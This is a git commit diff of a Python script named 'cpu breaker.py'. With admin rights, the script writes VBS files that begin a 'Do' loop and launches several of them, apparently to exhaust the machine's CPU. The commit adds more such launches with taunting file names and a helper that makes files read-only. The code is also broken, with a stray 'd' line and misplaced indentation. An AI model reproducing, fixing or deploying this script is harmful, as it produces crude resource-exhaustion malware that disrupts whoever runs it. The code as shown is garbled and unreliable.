6d159105ffe3cb67a189d61dff69c2f7d7bc9d21
BoldyDeadCoder <62553730+BoldyDeadCoder@users.noreply.github.com>
2024-01-30 22:02:53 -0500

    Update cpu breaker.py

--- cpu breaker.py
+++ cpu breaker.py
@@ -8,6 +8,7 @@ def is_admin():
         return False
 
 if is_admin():
+    d
     def create_and_run_vbs(file_name):
     with open(file_name + ".txt", 'w') as f:
         f.writelines("Do\n")
@@ -17,11 +18,18 @@ if is_admin():
     os.rename(file_name + ".txt", base + ".vbs")
     os.system("Start " + file_name + ".vbs")
 
-create_and_run_vbs("my_file")
-create_and_run_vbs("This_file")
-create_and_run_vbs("HI")
-create_and_run_vbs("keen")
-create_and_run_vbs("f_file")
+create_and_run_vbs("im_watching_file")
+create_and_run_vbs("This_man_file")
+create_and_run_vbs("HI_file")
+create_and_run_vbs("Girl!")
+create_and_run_vbs("Life_file")
+    def create_read_only_file(filename, content):
+        with open(filename, 'w') as file:
+            file.write(content)
+            os.chmod(filename, 0o444)  # Makes the file read-only
+            # Usage
+create_read_only_file('test.txt', 'This is a test')
+
 
     print("I have admin privileges!")
 else:
